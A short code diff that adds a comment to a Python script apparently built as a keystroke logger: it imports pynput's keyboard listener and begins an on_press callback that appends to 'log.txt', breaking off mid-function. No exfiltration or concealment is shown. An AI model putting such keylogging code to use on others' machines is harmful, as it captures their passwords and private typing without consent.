@@ -1,5 +1,6 @@
 from pynput import keyboard
 
+# on_press function is passed to the keyboard listener and prints to a log file
 def on_press(key):
     try:
         with open('log.txt','a') as f:
